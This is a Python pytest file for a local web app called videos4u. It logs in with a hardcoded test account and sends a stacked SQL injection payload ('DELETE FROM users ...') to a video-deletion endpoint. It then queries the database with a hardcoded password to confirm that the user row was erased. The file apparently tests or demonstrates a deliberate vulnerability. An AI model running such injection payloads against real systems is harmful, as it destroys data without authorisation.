import requests
import pytest
import pymysql 
import time

def login():
    data = {'username': 'jimstark', 'password': 'password1'}
    try:
        page = requests.post("https://localhost/core/login/login.php",data=data, verify=False)
    except:
        page = None
    assert page != None
    assert '{"success": true}' in page.text
    return page.headers["Set-Cookie"][8:136]

def test_injectBlind():
    conn=pymysql.connect(host='127.0.0.1',
                         port=33060,
                         user='videos4u',
                         password='olah6aeQuie7Oishol4Eej6oofee3aeg',
                         database='videos4u_web')
    query = conn.cursor()
    query.execute("SELECT username FROM users")
    test = query.fetchall()
    assert ('tomcampbell',) in test
    session = {"session": login()}
    data = {"video":"7;DELETE FROM users WHERE username='tomcampbell'"}
    try:
        page = requests.post("https://localhost/core/deleteVideo.php",data=data, cookies=session, verify=False)
    except:
        page = None
    conn.close()
    time.sleep(0.5)
    conn=pymysql.connect(host='127.0.0.1',
                         port=33060,
                         user='videos4u',
                         password='olah6aeQuie7Oishol4Eej6oofee3aeg',
                         database='videos4u_web')
    query = conn.cursor()
    query.execute("SELECT username FROM users")
    test = query.fetchall()
    assert ('tomcampbell',) not in test
